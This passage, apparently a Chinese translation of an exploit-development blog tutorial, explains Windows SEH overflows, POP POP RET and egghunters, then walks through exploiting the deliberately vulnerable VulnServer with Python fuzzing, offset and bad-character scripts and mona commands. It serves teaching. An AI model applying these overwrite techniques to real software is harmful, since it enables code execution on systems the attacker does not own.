class="lozad"></p><p><em>资料来源：ethicalhacker.net</em></p><p>如您所见，每个<strong>代码块</strong>都有自己的<strong>堆栈框架</strong>，由链接每个相应<em>框架</em>的箭头表示。</p><p>那么……它们是如何联系的？对每个<strong>异常处理程序来说</strong>，都有一个配置的<strong>异常注册记录</strong>，这些<strong>记录</strong>都链接在一起形成一个链表。该<strong>异常注册记录</strong>中包含众多领域，但即<code>_EXCEPTION_REGISTRATION_RECORD *Next;</code>它定义的下一个<strong>异常注册记录</strong>在<strong>SEH链</strong> -这是什么使我们过导航<strong>SEH链</strong>从<em>顶部至底部</em>。</p><p>现在，您可能想知道<strong>Windows SEH</strong>如何使用<strong>异常注册记录</strong>和<strong>处理程序</strong>等。当发生异常时，操作系统将从<strong>SEH链</strong>的顶部启动，并检查第一个<strong>异常注册记录</strong>以查看它是否可以处理异常/错误，如果可以，它将执行指向<strong>异常处理程序</strong>的指针定义的代码块-但是，如果不能，它将使用字段移至下<strong>一条*</strong>记录，<em>并沿*</em>SEH链*<em>向下<code>_EXCEPTION_REGISTRATION_RECORD *Next;</code>移动，并继续执行因此一直沿链向下，直到找到能够处理异常的</em>记录/处理程序*。</p><p>但是，如果没有预定义的异常处理程序功能适用，该怎么办？良好的窗口在每个<strong>SEH链</strong>的底部放置了一个默认/通用异常处理程序，它可以提供如下通用消息<code>Your program has stopped responding and needs to close</code>：通用处理程序在上图中由表示<code>0xffffff</code></p><p>下图提供了整个<strong>SEH链</strong>的简化概述</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114241.png" class="lozad"></p><p>我们还可以通过加载二进制文件并<strong>单击</strong>来查看具有<strong>免疫性</strong>的<strong>SEH链</strong><code>Alt+S</code> -如您在下图中所看到的，我们的<strong>SEH链</strong>在左下角以绿色突出显示，而<strong>SEH Record / SEH Handler</strong>在屏幕上以蓝色突出显示。堆。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114253.png" class="lozad"></p><p>在这种情况下，我们实际上有2个由<strong>SEH Records</strong>指定的处理程序-第一个是正常实现的处理程序，而第二个是地址<code>0028FFC4</code>的Window的<strong>OS Level</strong>处理程序，我们可以在下面的屏幕快照中看到。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114313.png" class="lozad"></p><h3 id="1-1-4-漏洞"><a href="#1-1-4-漏洞" class="headerlink" title="1.1.4 漏洞"></a>1.1.4 漏洞</h3><p>因此，回顾一下，我们已经介绍了异常是什么，不同类型的处理程序，还讨论了<strong>结构化异常处理程序的</strong> <em>真正</em>工作原理，因此现在我们可能应该从攻击者的角度谈谈这一点以及我们如何利用这些<strong>异常处理程序。</strong>处理程序来获得对程序执行流程的控制，类似于<code>EIP Overwrite</code>第1部分中的内容。</p><p>现在在<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">这里的</a>第1部分中-我们能够控制VulnServer和SLMail上的<em>执行流程</em>，从而也将它重定向到我们自己的<em>shellcode</em>并弹出一个反向shell，这当然是一个非常古老的漏洞，SEH应该解决此问题，但是一个非常糟糕的实现，很快就被利用了。</p><p>现在，我不想在这里展示一个疯狂的示例，因为我将在下面的“ <strong>示例”</strong>部分中进行介绍，但是这里的理论是我们不使用用户控制输入覆盖EIP，而是覆盖指向<strong>下一个SEH记录</strong>（即<strong>异常注册）</strong>的指针<strong>记录</strong>以及指向<strong>SE处理程序</strong>的指针，这些指针指向我们控制并可以放置shellcode的内存区域。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114327.png" class="lozad"></p><p>如您所见，我们没有像第1 部分那样覆盖<strong>EIP寄存器</strong>，<code>41414141</code>而是覆盖了<strong>SE Handler</strong>和<strong>SEH Record</strong>的指针。现在，在开始讨论Egghunter以及进行<em>SEH溢出</em>时如何使用它们之前，我想快速向您展示与<strong>SE Handler</strong>和<strong>SEH Record</strong>的指针相比，我们如何控制<strong>EIP寄存器</strong>。</p><p>我不会深入探讨细节，但是如果我们可以对永不重复的字符串进行<em>模糊处理</em>，然后计算偏移量，然后使用选择的数据覆盖<strong>SE Handler</strong>和<strong>SE Record</strong>，该偏移量可用于控制EIP。</p><p>在下面的示例中，我分析了偏移也是<strong>SE Record</strong>，<code>3519 Bytes</code>因此我在<strong>SE Record上</strong>加上了4 x B ，在<strong>SE Handler上</strong>加上了4 <strong>xC</strong>。查看下面的脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;BBBB&quot; </span><br><span class="line">seh = &quot;CCCC&quot;</span><br><span class="line"></span><br><span class="line">buffer=&quot;A&quot; * 3515</span><br><span class="line">buffer += nseh</span><br><span class="line">buffer += seh</span><br><span class="line"></span><br><span class="line">junk = &quot;D&quot;*(4500-len(buffer))</span><br><span class="line">buffer += junk</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">print &quot;[*] Starting to Fuzz GMON&quot;</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">print &quot;[*] Finished Fuzzing Check SEH Chain on Immunity&quot;</span><br><span class="line">s.close()</span><br><span class="line">except:</span><br><span class="line">print &quot;couldn&apos;t connect to server&quot;</span><br></pre></td></tr></table></figure><p>现在，如果我们跳过<strong>Immunity</strong>并查看<strong>SEH链，</strong>我们将看到以下内容。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114343.png" class="lozad"></p><p>首先让我向您展示一些东西，当前应用程序处于崩溃状态（当然），但是我们仍然可以通过按<strong>Shift + F9</strong>将异常传递给程序-如果这样做，我们会注意到一些有趣的东西。</p><p><strong>SE Handler</strong>在堆栈上的值被压入<strong>EIP寄存器</strong> ，这当然不是很理想！现在，我们可以控制整个程序的执行流程。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114352.png" class="lozad"></p><h3 id="1-1-5-提及POP-POP-RET"><a href="#1-1-5-提及POP-POP-RET" class="headerlink" title="1.1.5 提及POP POP RET"></a>1.1.5 提及POP POP RET</h3><p>因此，如您在上面的屏幕截图/示例中所看到的，我们实际上生活在<strong>SE Handler</strong>的土地或区域中，由于空间的限制以及我们必须使用的存储区域的小巧性，我们实际上并不好当然，我们也许可以将Egghunters纳入其中，但我将在本文后面讨论。我想首先谈谈<code>POP POP RET</code>通常与<strong>SEH溢出</strong>结合使用的技术<strong>。</strong></p><h4 id="1-1-5-1-什么是POP-POP-RET？"><a href="#1-1-5-1-什么是POP-POP-RET？" class="headerlink" title="1.1.5.1 什么是POP POP RET？"></a><strong>1.1.5.1 什么是POP POP RET？</strong></h4><p>现在，实际上，<code>POP POP RET</code>我们将<strong>SE Handler</strong>值替换为一条<code>POP POP RET</code>指令的内存地址，这将听起来很真实，这将在技术上运行这些汇编指令，从而将我们<strong>引向nSEH。</strong></p><p>值得一提的是，<em>弹出</em>值转到的寄存器并不重要，我们只需要将<strong>ESP</strong> 的值上移<em>两次</em>，然后返回即可执行。因此<em>POP EAX</em>，<em>POP EBC，POP ECX</em>等都将适用，只要<code>RET</code>在两次<em>弹出</em>后有相关说明</p><h4 id="1-1-5-2-我们为什么要POP-POP-RET？"><a href="#1-1-5-2-我们为什么要POP-POP-RET？" class="headerlink" title="1.1.5.2 我们为什么要POP POP RET？"></a>1.1.5.2 我们为什么要POP POP RET？</h4><p>现在，如果您回想<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">第1部分</a> -一旦我们获得了对<strong>返回地址</strong>和<strong>EIP的</strong>控制，我们就找到了一条<strong>JMP ESP</strong>指令，以跳到我们的堆栈代码的顶部，在此我们的shell代码和NOP滑动，我们获得了代码执行权。现在，如果我们尝试向<strong>SE Handler中</strong>添加<strong>JMP ESP</strong>指令的内存位置，则Windows会自动将所有寄存器清零，以防止用户跳到那里的shellcode，但这确实是一个有缺陷的保护机制。</p><p>您实际上可以在下面的屏幕中看到<strong>ESI</strong>和<strong>EDI</strong>已被清零，以帮助减轻攻击者直接跳到Shellcode的风险。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114508.png" class="lozad"></p><p>现在就在这里<code>POP POP RET</code>，让我们首先记住一下<strong>SEH Record</strong>＆<strong>Handler</strong>在堆栈上的布局</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114516.png" class="lozad"></p><p>现在，让我们考虑一下<strong>POP POP RET</strong>在这里将执行的操作：<em>POP（向上移动4个字节）<em>，</em>POP（向上移动4个字节）<em>和</em>RET（简单返回，将地址发送给EIP作为下一条要执行的指令）</em> -现在我们有了完全控制权； ）</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114527.png" class="lozad"></p><h4 id="1-1-5-3-查找POP-POP-RET模块和说明"><a href="#1-1-5-3-查找POP-POP-RET模块和说明" class="headerlink" title="1.1.5.3 查找POP POP RET模块和说明"></a>1.1.5.3 查找POP POP RET模块和说明</h4><p>现在，我不想在这里深入探讨如何找到适用的模块和说明，因为我将在示例部分中介绍它，但长话短说是<strong>mona</strong></p><p>与<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">第1部分</a>类似，我们大量使用了<strong>mona</strong>，在执行<strong>SEH溢出</strong>时也将使用它-我们要做的就是发出以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona seh</span><br></pre></td></tr></table></figure><p>这将自动在所有可用模块中搜索<code>POP POP RET</code>序列。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114536.png" class="lozad"></p><p>现在，就像漏洞利用一样，我们必须确保我们选择内存地址中具有0个错误字符的模块，并避免使用诸如<strong>SEEPSEH之类的*</strong>SEH防护措施*，我将在后面讨论。</p><hr><h2 id="1-2-彩蛋猎人101"><a href="#1-2-彩蛋猎人101" class="headerlink" title="1.2 彩蛋猎人101"></a>1.2 彩蛋猎人101</h2><h3 id="1-2-1-什么是彩蛋猎人？"><a href="#1-2-1-什么是彩蛋猎人？" class="headerlink" title="1.2.1 什么是彩蛋猎人？"></a>1.2.1 什么是彩蛋猎人？</h3><p><em>Egghunter是一小段shellcode，通常为32个字节，可用于在所有内存空间中搜索我们的最后阶段shellcode</em></p><h3 id="1-2-2-彩蛋者如何工作？"><a href="#1-2-2-彩蛋者如何工作？" class="headerlink" title="1.2.2 彩蛋者如何工作？"></a>1.2.2 彩蛋者如何工作？</h3><p><a href="https://www.exploit-db.com/docs/english/18482-egg-hunter-a-twist-in-buffer-overflow.pdf" target="_blank" rel="noopener">https://www.exploit-db.com/docs/english/18482-egg-hunter-a-twist-in-buffer-overflow.pdf</a></p><p>我想概述一下Egghunters在这里的工作方式，而无需深入了解，就像我上面已经说过的那样</p><p><em>Egghunter是一小段shellcode，通常为32个字节，可用于在所有内存空间中搜索我们的最后阶段shellcode</em></p><p>这听起来不错，但为什么不仅仅使用简单的<strong>Short JMP</strong>或<strong>JMP ESP</strong>跳转到我们的shellcode- 想象一下您有很少的空间可以使用，例如<strong>50字节</strong>。这没有足够的空间来放置一些shell代码，但是足以放置一个<strong>32字节的Egghunter</strong></p><p>假设我们可以将<strong>32字节的</strong> hunter放入堆栈/内存，并且能够将执行重定向到hunter的位置，我们可以告诉hunter在整个内存空间中搜索预定义的标签，例如<code>MOCH</code>，我们的shellcode将是直接放在此标签（又称<strong>鸡蛋）之后</strong></p><p>所以执行流程看起来像这样</p><ol><li>控制执行力</li><li>跳转到包含<strong>32字节Egghunter的</strong>小缓冲区空间</li><li>Egghunter执行并在所有内存中搜索<strong>预定义的鸡蛋</strong></li><li>Egghunter找到<strong>鸡蛋</strong>并执行放置<em>在</em> <strong>鸡蛋*</strong>之后的* shellcode</li></ol><h3 id="1-2-3-一个关于NTDisplayString的词"><a href="#1-2-3-一个关于NTDisplayString的词" class="headerlink" title="1.2.3 一个关于NTDisplayString的词"></a>1.2.3 一个关于NTDisplayString的词</h3><p>在本文中，我们将使用<strong>32字节</strong> Egghunter，它利用<code>NTDisplayString</code>显示为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NTSYSAPI </span><br><span class="line">NTSTATUS</span><br><span class="line">NTAPI</span><br><span class="line"></span><br><span class="line">NtDisplayString(</span><br><span class="line"></span><br><span class="line">  IN PUNICODE_STRING      String );</span><br></pre></td></tr></table></figure><p>[参考] [<a href="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtDisplayString.html]" target="_blank" rel="noopener">https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtDisplayString.html]</a></p><p><code>NTDisplayString</code>实际上是在Windows中使用相同的系统调用来显示蓝屏，那么这如何在我们的<strong>Egghunter中</strong>发挥<strong>作用？</strong></p><p>好吧，我们滥用了以下事实：该系统调用用于验证地址范围，并且指针也被读取而不被写入。</p><p>这种方法有一个小的缺点，它的系统调用号<code>NTDisplayString</code>无法更改，而且多年来，系统调用号在Windows版本和体系结构上均已更改。</p><p>当我写这篇文章时，我实际上遇到了我的Egghunter出现的一些问题，<code>Access Violation reading: FFFFFF</code>即执行<code>INT 2E</code>系统调用时。原因？</p><p>因为我试图在Windows的64位系统上运行Egghunter，所以我有点愚蠢，但是由于该应用程序被编译为32位应用程序并且过去没有太多问题，因此我对此没有多加考虑。</p><p>Corelan出色地解释了Egghunter的每个组装指令的功能，因此请查看此处的文章<a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/" target="_blank" rel="noopener">。</a></p><hr><h1 id="0x02-例子"><a href="#0x02-例子" class="headerlink" title="0x02 例子"></a>0x02 例子</h1><h2 id="2-1-带Egghunter的VulnServer"><a href="#2-1-带Egghunter的VulnServer" class="headerlink" title="2.1 带Egghunter的VulnServer"></a>2.1 带Egghunter的VulnServer</h2><p>在此示例中，我将介绍<strong>VulnServer</strong>，这是一个故意易受攻击的服务器，它在端口9999上侦听任何传入的连接，并支持多种类型的命令，如之前在第1部分中看到的。</p><h3 id="2-1-1-模糊和发现崩溃"><a href="#2-1-1-模糊和发现崩溃" class="headerlink" title="2.1.1 模糊和发现崩溃"></a>2.1.1 模糊和发现崩溃</h3><p>现在类似于<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">第1部分，</a>我不想演示如何模糊<strong>VulnServer</strong>上的每个可用命令。如果您正在寻找类似的内容，请检查我们的<strong>booFuzz，</strong>它非常酷。在这种情况下，我只打算模糊<code>GMON</code>命令以节省时间并专注于开发部分本身。</p><p>让我们使用以下脚本对该命令进行简单的模糊处理来开始它。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">buffer=[&quot;A&quot;]</span><br><span class="line">counter=100</span><br><span class="line"></span><br><span class="line">while len(buffer) &lt;= 30:</span><br><span class="line">buffer.append(&quot;A&quot;*counter)</span><br><span class="line">counter=counter+200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for string in buffer:</span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(string)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + string))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(string)</span><br></pre></td></tr></table></figure><p>我们在这里所做的工作与第1部分中介绍的基本堆栈溢出非常相似，其中我们在进行以下操作</p><ol><li>在<strong>端口9999</strong>上连接到<strong>bof.local</strong></li><li>发送<code>GMON /.:/ + string += 200</code>-其中字符串=，<code>A</code>并按<code>200</code>每个周期递增。</li><li>关闭TCP连接</li></ol><p>一旦应用程序崩溃，脚本将开始运行，我们可以检查<strong>Immunity</strong>。</p><p>现在，当我们跳到Immunity时，我们可能会注意到一些有趣的东西，我注意到的第一件事就是<code>Access Violation when writing to [06500000]</code>Immunity的页脚，这是告诉我们该应用程序处于崩溃状态，并且实际上不知道下一步该<em>怎么做</em> -您可能还要注意，与包含第1部分的<strong>EIP</strong>值不同，它看起来很正常<code>41414141</code>-这是由于我们没有过度运行返回地址并获得对<strong>EIP寄存器的</strong>控制，而是超过了堆栈上的<strong>nSEH</strong>和<strong>SEH</strong>值。</p><p>让我们通过在Immunity中按下来建立<strong>SEH链</strong><code>ALT+S</code>。这样做之后，我们会注意到一些有趣的<code>41414141</code>输出，我们过去在<strong>EIP寄存器中</strong>看到的输出现在显示在<strong>SE Handler中</strong>。右键单击<code>41414141</code>并选择<code>Follow in Stack</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114559.png" class="lozad"></p><p>完美，我们现在可以使用用户提供的输入来覆盖指向<strong>nSEH</strong>和<strong>SEH</strong>的指针。现在，让我们找出必须提供多少用户提供的输入才能到达<strong>nSEH</strong>和<strong>SEH</strong>的指针</p><h3 id="2-1-2-寻找偏移"><a href="#2-1-2-寻找偏移" class="headerlink" title="2.1.2 寻找偏移"></a>2.1.2 寻找偏移</h3><p>在这里，我们再次找到偏移量，因为我确信您知道这是漏洞利用开发的非常普遍的部分，并且不仅适用于<strong>SEH Overlows-</strong>有几种不同的方法可以执行此<em>操作</em>，例如<em>手动</em>，<strong>metasploit</strong>和<strong>mona，</strong>但是由于偏爱，我会在这里坚持<strong>蒙娜丽莎</strong>。</p><p>首先，使用以下命令创建一个永不重复的字符串/循环模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona pc 6000</span><br></pre></td></tr></table></figure><p>并将其与我们的模糊测试脚本结合在一起，但不必每次都重复A的增量200字节，我们只需将我们的模式与 <code>GMON :./</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">buffer = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa....&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with pattern containing %s bytes&quot; %len(buffer)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer)</span><br></pre></td></tr></table></figure><p>现在，我们的应用程序将返回崩溃状态并报告a，<code>Access Violation</code>但是这次<strong>SE Handler</strong>包含<code>45336E45</code>的内容相比<code>41414141</code>-让我们再次跳转到堆栈并检查当前驻留在堆栈上的数据。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114610.png" class="lozad"></p><p>完善！如您所见，我们正在查看我们永不重复的字符串，并且无法仅通过在<strong>mona中</strong>使用以下命令之一来计算偏移量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!mona findmsp</span><br><span class="line">!mona po 1En2</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114621.png" class="lozad"></p><p>如您所见，我们花了<strong>3515</strong> <strong>个字节</strong>来超出<strong>nSEH</strong>的值，而花了<strong>3519个字节</strong>来超过<strong>SE Handler</strong>的值-在我开始拼凑所有内容之前，我想首先花时间来查找任何不良字符。</p><h3 id="2-1-3-寻找坏字符"><a href="#2-1-3-寻找坏字符" class="headerlink" title="2.1.3 寻找坏字符"></a>2.1.3 寻找坏字符</h3><p>我不会在这里解释为什么我们需要找到坏字符，因为我在<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">第1部分中</a>做了很好的工作，所以就去那里。</p><p>让我们使用下面的简单脚本，通过命令将每个可能的字符的字符串发送到<strong>VulnServer</strong><code>GMON</code>。当然，我们将<code>\x00</code>字符（即<strong>空字节）</strong>排除在外<strong>。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;B&quot;*4</span><br><span class="line">seh = &quot;C&quot;*4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">badchars = (&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;</span><br><span class="line">&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span><br><span class="line">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;</span><br><span class="line">&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;</span><br><span class="line">&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;</span><br><span class="line">&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;</span><br><span class="line">&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;</span><br><span class="line">&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * (3515-len(badchars))</span><br><span class="line">print &quot;[*] There are %s&quot; %len(badchars) + &quot; bad chars to test&quot;</span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(buffer) + &quot; A&apos;s&quot;</span><br><span class="line">buffer += badchars #All of badchars</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #CCCC</span><br><span class="line">junk = &quot;D&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with everything containing %s bytes&quot; %len(buffer)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer)</span><br></pre></td></tr></table></figure><p>现在，仅简要介绍我们在这里所做的事情</p><ol><li><p>计算不良字符的数量并从<code>3515</code>我们的<strong>偏移量</strong>减去该值</p></li><li><p>发送 <code>3260 A&#39;s + 255 bad chars</code></p></li><li><p>发送<code>BBBB</code>以覆盖<strong>nSEH</strong>值</p></li><li><p>发送<code>CCCC</code>以覆盖<strong>SEH</strong>值</p></li><li><p>填充剩余空间 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDDD...</span><br></pre></td></tr></table></figure><ol><li>我们这样做的原因是我们没有填充剩余空间，所以<strong>SEH</strong>不会触发</li></ol></li></ol><p>ps：由于<strong>SE处理程序</strong>（又称52字节）之后空间的限制，我决定在覆盖<strong>nSEH</strong>和<strong>SEH</strong>之前发送错误字符</p><p>检查内存转储，我们可以看到除了<strong>空字节</strong>又名，我们实际上有零个坏字符<code>\x00</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114634.png" class="lozad"></p><h3 id="2-1-4-查找POP-POP-RET指令"><a href="#2-1-4-查找POP-POP-RET指令" class="headerlink" title="2.1.4 查找POP POP RET指令"></a>2.1.4 查找POP POP RET指令</h3><p>我已经详细说明<code>POP POP RET</code>了指令的顺序及其重要性，因此我将坚持实用并让上面的部分<code>A Mention on POP POP RET</code>进行讨论。</p><p>首先让我们找到一个适用的模块，该模块将使用以下带有<strong>mona的</strong>命令包含此指令序列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona seh</span><br></pre></td></tr></table></figure><p>在这里，一个明显的选择是突出的，<code>efffunc.dll</code>因为它没有使用任何安全机制（例如<code>SafeSEH</code> 或）进行编译<code>ASLR</code></p><p>让我们双击该模块，然后验证组装说明并确保这是我们所需要的。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114653.png" class="lozad"></p><p>完美，我们有<code>POP EBX</code> <code>POP EBP</code>和<code>RETN</code>指令。这正是我们所需要的<code>POP POP RET</code></p><p>对于这一部分，我建议您在<code>POP POP RET</code>函数的开头放置一个断点，以便您可以逐步进行下一部分以了解会发生什么，只需在<strong>mona中</strong>双击所选模块，然后按<code>F2</code>一下<code>POP EBX</code>说明即可。</p><p>现在，我将修改python脚本，以如下所示用指令<code>seh</code>的值覆盖变量<code>POP POP RET</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 